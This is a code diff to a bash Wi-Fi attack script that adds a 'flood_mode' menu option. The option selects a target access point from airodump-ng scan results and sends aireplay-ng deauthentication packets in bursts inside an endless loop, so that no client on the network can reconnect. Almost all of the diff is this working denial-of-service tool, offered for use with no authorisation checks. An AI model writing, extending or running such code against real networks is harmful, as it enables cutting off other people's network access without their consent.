@@ -695,6 +695,170 @@ chaos_mode() {
 }
 
 ################################################################################
+# FUNCTION: flood_mode
+# FLOOD MODE: High-frequency deauth attack with no reconnection gap
+################################################################################
+flood_mode() {
+    echo ""
+    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
+    echo -e "${RED}                   FLOOD MODE${NC}"
+    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
+    echo ""
+    echo -e "${RED}[⚠]  WARNING: This will flood the network with deauth packets!${NC}"
+    echo -e "${RED}[⚠]  All clients will be disconnected continuously!${NC}"
+    echo -e "${RED}[⚠]  NO RECONNECTION GAP - devices cannot reconnect!${NC}"
+    echo ""
+
+    if [ -z "$MONITOR_INTERFACE" ]; then
+        echo -e "${RED}[✗] Monitor mode not enabled!${NC}"
+        read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
+        return 1
+    fi
+
+    echo -e "${YELLOW}[?] Choose input method:${NC}"
+    echo -e "${CYAN}  [1] Manual Input (Type BSSID)${NC}"
+    echo -e "${CYAN}  [2] Auto-Target (Select from scan results)${NC}"
+    echo ""
+    read -p "$(echo -e ${GREEN}"[>] Select option: "${NC})" choice
+
+    local target_bssid=""
+    local target_channel=""
+
+    case $choice in
+        1)
+            echo ""
+            read -p "$(echo -e ${YELLOW}"[>] Enter Target BSSID (AP MAC): "${NC})" target_bssid
+            ;;
+        2)
+            # Refresh CSV path
+            local found_csv
+            found_csv=$(ls -1 "$TEMP_DIR"/airodump-*.csv 2>/dev/null | head -n1)
+            [ -n "$found_csv" ] && CSV_FILE="$found_csv"
+
+            if [ ! -f "$CSV_FILE" ]; then
+                echo -e "${RED}[✗] No scan results found! Please scan networks first.${NC}"
+                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
+                return 1
+            fi
+
+            # Remove stale AP list
+            rm -f "$TEMP_DIR/aps.txt"
+
+            echo ""
+            echo -e "${CYAN}Available Networks:${NC}"
+            echo ""
+
+            local ap_count=0
+            while IFS=',' read -r f1 f2 f3 f4 f5 f6 f7 f8 f9 f10 f11 f12 f13 f14 rest; do
+                f1="${f1// /}"
+                f3="${f3// /}"
+                f14="${f14// /}"
+                if [[ "$f1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+                    ap_count=$((ap_count + 1))
+                    local essid="$f14"
+                    local channel="$f3"
+                    [ -z "$essid" ] && essid="Hidden Network"
+                    echo -e "${GREEN}  [$ap_count] $essid${NC}"
+                    echo -e "${CYAN}      BSSID: $f1${NC}"
+                    echo -e "${CYAN}      Channel: $channel${NC}"
+                    echo ""
+                    echo "$ap_count|$f1|$essid|$channel" >> "$TEMP_DIR/aps.txt"
+                fi
+            done < "$CSV_FILE"
+
+            if [ "$ap_count" -eq 0 ]; then
+                echo -e "${RED}[✗] No networks found in scan results.${NC}"
+                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
+                return 1
+            fi
+
+            read -p "$(echo -e ${YELLOW}"[>] Enter network number: "${NC})" ap_num
+
+            local selected_ap
+            selected_ap=$(grep "^${ap_num}|" "$TEMP_DIR/aps.txt")
+            if [ -z "$selected_ap" ]; then
+                echo -e "${RED}[✗] Invalid network number.${NC}"
+                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
+                return 1
+            fi
+
+            target_bssid=$(echo "$selected_ap" | cut -d'|' -f2)
+            local target_essid
+            target_essid=$(echo "$selected_ap" | cut -d'|' -f3)
+            target_channel=$(echo "$selected_ap" | cut -d'|' -f4)
+
+            echo ""
+            echo -e "${GREEN}[✓] Target selected: $target_essid ($target_bssid)${NC}"
+            echo -e "${GREEN}[✓] Channel: $target_channel (auto-detected)${NC}"
+            ;;
+        *)
+            echo -e "${RED}[✗] Invalid option.${NC}"
+            read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
+            return 1
+            ;;
+    esac
+
+    echo ""
+    echo -e "${YELLOW}[?] Configure flood attack settings:${NC}"
+    read -p "$(echo -e ${YELLOW}"[>] Packets per burst (default=100): "${NC})" packet_count
+    if [[ ! "$packet_count" =~ ^[0-9]+$ ]] || [ "$packet_count" -lt 1 ]; then
+        packet_count=100
+    fi
+
+    read -p "$(echo -e ${YELLOW}"[>] Delay between bursts in ms (default=50): "${NC})" delay_ms
+    if [[ ! "$delay_ms" =~ ^[0-9]+$ ]] || [ "$delay_ms" -lt 10 ]; then
+        delay_ms=50
+    fi
+
+    # Use auto-detected channel if available, otherwise ask for manual input
+    local channel
+    if [ -n "$target_channel" ]; then
+        channel="$target_channel"
+        echo -e "${GREEN}[✓] Using auto-detected channel: $channel${NC}"
+    else
+        read -p "$(echo -e ${YELLOW}"[>] Target Channel (1-14, required for attack): "${NC})" channel
+        if [[ ! "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 14 ]; then
+            echo -e "${RED}[✗] Invalid channel. Must be 1-14.${NC}"
+            read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
+            return 1
+        fi
+    fi
+
+    echo ""
+    echo -e "${YELLOW}[+] Setting monitor interface to channel $channel...${NC}"
+    iw dev "$MONITOR_INTERFACE" set channel "$channel" >/dev/null 2>&1
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}[✓] Channel set to $channel${NC}"
+    else
+        # Fallback to iwconfig
+        iwconfig "$MONITOR_INTERFACE" channel "$channel" >/dev/null 2>&1
+        if [ $? -eq 0 ]; then
+            echo -e "${GREEN}[✓] Channel set to $channel (using iwconfig)${NC}"
+        else
+            echo -e "${YELLOW}[i] Could not set channel, will attempt attack anyway${NC}"
+        fi
+    fi
+
+    echo ""
+    echo -e "${RED}[!] FLOOD MODE ACTIVATED!${NC}"
+    echo -e "${RED}[!] Sending $packet_count deauth packets per burst${NC}"
+    echo -e "${RED}[!] Delay: ${delay_ms}ms between bursts${NC}"
+    echo -e "${RED}[!] NO RECONNECTION GAP - Continuous flood${NC}"
+    echo -e "${YELLOW}[i] Press Ctrl+C to stop the attack${NC}"
+    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
+    echo ""
+
+    # Convert ms to seconds for sleep
+    local delay_sec=$(echo "scale=3; $delay_ms / 1000" | bc)
+
+    while true; do
+        aireplay-ng --ignore-negative-one -0 "$packet_count" -a "$target_bssid" "$MONITOR_INTERFACE" 2>/dev/null
+        echo -e "${RED}[*] Flood burst sent: $packet_count packets to $target_bssid${NC}"
+        sleep "$delay_sec"
+    done
+}
+
+################################################################################
 # FUNCTION: show_menu
 ################################################################################
 show_menu() {
@@ -736,6 +900,9 @@ show_menu() {
                 chaos_mode
                 ;;
             5)
+                flood_mode
+                ;;
+            6)
                 disable_monitor_mode
                 ;;
             *)
